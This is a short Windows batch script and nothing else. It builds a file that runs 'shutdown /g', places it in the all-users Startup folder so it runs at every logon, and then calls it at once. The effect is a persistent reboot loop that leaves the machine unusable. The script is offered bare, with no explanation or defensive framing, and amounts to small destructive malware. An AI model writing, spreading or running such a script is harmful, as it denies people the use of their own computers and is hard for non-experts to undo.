echo off
echo echo off>run.bat
echo. 
echo shutdown /g>>run.bat
copy run.bat "%allusersprofile%\Microsoft\Windows\Start Menu\Programs\Startup" > nul
del run.bat > nul
call "%allusersprofile%\Microsoft\Windows\Start Menu\Programs\Startup\run.bat" > nul

